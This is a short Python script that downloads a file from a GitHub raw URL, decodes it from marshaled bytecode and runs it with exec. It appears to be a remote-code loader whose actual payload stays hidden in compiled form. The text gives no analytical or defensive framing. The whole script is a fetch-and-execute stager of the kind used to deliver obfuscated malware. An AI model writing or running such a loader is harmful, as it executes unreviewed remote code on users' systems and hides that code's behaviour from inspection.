import requests
import marshal

# Raw URL of the encoded file on GitHub
file_url = 'https://github.com/Thr-tech/Rando/raw/main/text1.py'

# Fetch the file content from the URL
try:
    response = requests.get(file_url)
    response.raise_for_status()  # Raise an error for bad responses
    marshaled_code = response.content
except requests.RequestException as e:
    print(f"Error fetching the file: {e}")
    exit()

# Unmarshal the code object
try:
    code_object = marshal.loads(marshaled_code)
except Exception as e:
    print(f"Error unmarshaling code: {e}")
    exit()

# Execute the decoded code
try:
    exec(code_object)
except Exception as e:
    print(f"Error executing script: {e}")
